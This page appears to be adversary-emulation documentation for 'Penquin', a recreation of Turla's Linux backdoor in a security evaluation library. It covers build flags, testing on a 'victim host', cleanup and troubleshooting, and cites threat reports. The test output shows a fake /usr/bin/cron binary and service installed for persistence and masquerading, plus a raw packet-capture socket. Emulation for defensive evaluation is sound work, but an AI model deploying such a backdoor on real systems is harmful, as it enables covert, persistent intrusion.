<p>Context on <code v-pre>cron</code> utility usage: Based on <a href="http://www.muppetlabs.com/%7Ebreadbox/software/tiny/teensy.html" class="outbound" target="_blank"><span>reference article</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
<ul>
<li><code v-pre>-s</code> = <code v-pre>gcc</code>&#x27;s version of the <code v-pre>strip</code> command</li>
<li><code v-pre>-O3</code>= optimizes the code</li>
<li><code v-pre>-o</code> = names the output file (default is a.out)</li>
<li><code v-pre>-lpcap</code> = is used to statically link the lpcap library - this is consistent with CTI reporting in the <a href="https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf" class="outbound" target="_blank"><span>Leonardo Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</li>
</ul>
<p>Binary is now ready for deployment in operations. Continue to next section if only testing execution locally.</p>
<br/>
<br/>
<doc-anchor-target id="testing">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#testing">#</doc-anchor-trigger>
        <span>Testing</span>
    </h2>
</doc-anchor-target>
<hr>
<p>This assumes the build script (<a href="build_penquin.sh">build_Penquin.sh</a>) has been executed with the resulting binaries in the folder.
Summary of testing process</p>
<ul>
<li>Moves <code v-pre>penquin</code> to <code v-pre>/root/</code> folder</li>
<li>Executes <code v-pre>penquin</code></li>
<li>Verifies<code v-pre>penquin</code> was executed as expected</li>
<li>Requires <code v-pre>sudo</code> privileges to execute</li>
</ul>
<ol>
<li><p>Navigate to the <code v-pre>/Resources/Penquin/</code> folder</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /Resources/Penquin/</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify the <code v-pre>execution_penquin_test.sh</code> exists in the folder with executable permissions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">ls -lart execution_penquin_test.sh</code></pre>
</doc-codeblock></div>
</li>
<li><p>Run the following command on the victim host</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo ./execution_penquin_test.sh</code></pre>
</doc-codeblock></div>
<p>Results should look like the following:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">=========================================================
Beginning Tests
=========================================================
Setting up installation....

✔ Success: cp ./hsperfdata /root/hsperfdata
Archive:  hsperfdata
inflating: hsperfdata
✔ Success: ./execution_penquin_test.sh
Test 1 Success! /root/hsperfdata exists &amp; has executable permissions
Executing...(for 8 seconds)...
✔ Success:
=========================================================
[Test 1]: Installation Check
=========================================================
Testing dropped files....
/usr/bin/cron exists &amp; has executable permissions
/etc/systemd/system/cron.service exists but does not have executable permissions
=========================================================
[Test 2]: Execution Checks
=========================================================
Checking cron service status...
Test 2 Success! cron is running
checking for running cron process from usr/bin rather than usr/sbin...
Test 3 Success! Cron is running under PGID: 1071197
checking raw socket connection...
Test 4 Success! A raw socket is running with cron active
=========================================================
[All Tests Complete]
=========================================================</code></pre>
</doc-codeblock></div>
</li>
</ol>
<br/>
<br/>
<doc-anchor-target id="cleanup-instructions">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup-instructions">#</doc-anchor-trigger>
        <span>Cleanup Instructions</span>
    </h2>
</doc-anchor-target>
<hr>
<p>Summary of clean up process:</p>
<ul>
<li>Removes all files dropped to disk</li>
<li>Kills all processes associated with our cron service in <code v-pre>/usr/bin/</code></li>
<li>Reloads the cron service back to it&#x27;s original state operating from <code v-pre>/usr/sbin</code></li>
<li>Requires <code v-pre>sudo</code> privileges</li>
</ul>
<ol>
<li><p>Navigate to the <code v-pre>/Resources/cleanup/Penquin/</code> folder</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /Resources/cleanup/Penquin/</code></pre>
</doc-codeblock></div>
</li>
<li><p>Verify the cleanup_penquin.sh exists in the folder with executable permissions.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">ls -lart cleanup_penquin.sh</code></pre>
</doc-codeblock></div>
</li>
<li><p>With <code v-pre>sudo</code>, Execute the following command in the <code v-pre>/Resources/cleanup/Penquin/</code> folder.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">sudo ./clean_penquin.sh</code></pre>
</doc-codeblock></div>
</li>
</ol>
<p>Expected output
&#x60;&#x60;&#x60;bash
Destroying all the Penquins...</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Removing files on disk...
✔ /root/hsperfdata exists
✔ Success: rm /root/hsperfdata
✔ /root/hsperfdata does not exist
✔ /usr/bin/cron exists
✔ Success: rm /usr/bin/cron
✔ /usr/bin/cron does not exist
✔ /etc/systemd/system/cron.service exists
✔ Success: rm /etc/systemd/system/cron.service
✔ /etc/systemd/system/cron.service does not exist

Killing the cron processes...
Cron is running under PGID: 698039
✔ Success: kill -- -698039
Test  Success! Verified all proesses associated with the group id

Resetting the cron service (takes 3 seconds)...
✔ Success:
cron is NOT running
✔ Success:
✔ Success: systemctl start cron
cron is running
*********************     Host Reset Complete    *********************
```</code></pre>
</doc-codeblock></div>
<br/>
<br/>
<doc-anchor-target id="misc">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#misc">#</doc-anchor-trigger>
        <span>Misc</span>
    </h2>
</doc-anchor-target>
<hr>
<doc-anchor-target id="cti-evidence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cti-evidence">#</doc-anchor-trigger>
        <span>CTI Evidence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf" class="outbound" target="_blank"><span>Leonardo Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li>Other projects (cd00r.c &amp; LOKI2) referenced in the <a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf" class="outbound" target="_blank"><span>Kaspersky - Penquins Moonlit Maze Report</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://www.youtube.com/watch?v=JXsjRUxx47E&amp;t=647s" class="outbound" target="_blank"><span>Leonardo Presentation</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://packetstormsecurity.com/files/22121/cd00r.c.html" class="outbound" target="_blank"><span>cd00r.c</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="http://phrack.org/issues/51/6.html#article" class="outbound" target="_blank"><span>LOKI2 - Phrack Volume 7, Issue 51</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and github code from <a href="https://github.com/JeremyNGalloway/LOKI2" class="outbound" target="_blank"><span>JeremyNGalloway</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li>Activation Packet <a href="https://lab52.io/blog/looking-for-penquins-in-the-wild/" class="outbound" target="_blank"><span>Lab52</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
</ul>
<doc-anchor-target id="references">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#references">#</doc-anchor-trigger>
        <span>References</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Filter uses reference code from <a href="https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf" class="outbound" target="_blank"><span>DevDungeon</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li>Stuart McMurray - <a href="https://www.youtube.com/watch?v=Sig1QTev6MY" class="outbound" target="_blank"><span>Offensive pcap presentation</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li>C string obfuscation crypt.h - <a href="https://github.com/BroOfBros/C-Cpp-Macro-Encryption/blob/master/Crypt.h" class="outbound" target="_blank"><span>BroOfBros</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
</ul>
<br/>
<br/>
<doc-anchor-target id="troubleshooting">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#troubleshooting">#</doc-anchor-trigger>
        <span>Troubleshooting</span>
    </h2>
</doc-anchor-target>
<hr>
<ol>
<li><p>Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">ps -efj | grep cron</code></pre>
</doc-codeblock></div>
</li>
<li><p>Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the <code v-pre>PGID</code> placeholder in the below command. After executing, the entire process tree should be killed. Verify with <code v-pre>ps -efj | grep cron</code> command or <code v-pre>ps -Hlwwfe</code>. :ax: (i.e. <code v-pre>kill -- -252557</code>)</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">kill -- -PGID</code></pre>
</doc-codeblock></div>
</li>
<li><p>Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">systemctl status cron</code></pre>
</doc-codeblock></div>
<p>The status message should resemble the below blurb:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">● cron.service - Regular background program processing daemon
    Loaded: loaded (/lib/systemd/system/cron.service; disabled; vendor preset: enabled)
    Active: active (running) since Wed 2022-12-07 20:34:13 UTC; 4s ago
    Docs: man:cron(8)
Main PID: 39759 (cron)
    Tasks: 1 (limit: 9530)
    Memory: 2.3M
    CGroup: /system.slice/cron.service
            └─39759 /usr/sbin/cron -f</code></pre>
</doc-codeblock></div>
</li>
</ol>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/turla/resources/lightneuron/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Light​Neuron</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/turla/resources/mimikatz/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Updates to the Mimikatz bin</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Penquin", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
